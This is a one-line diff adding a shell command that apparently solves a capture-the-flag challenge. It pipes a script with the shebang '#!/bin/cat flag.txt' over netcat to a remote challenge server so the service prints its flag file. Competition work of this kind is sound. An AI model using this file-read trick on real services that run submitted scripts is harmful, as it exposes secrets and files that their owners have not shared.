@@ -1,0 +1,1 @@
+echo -e '#!/bin/cat flag.txt' | nc amt.rs 31178
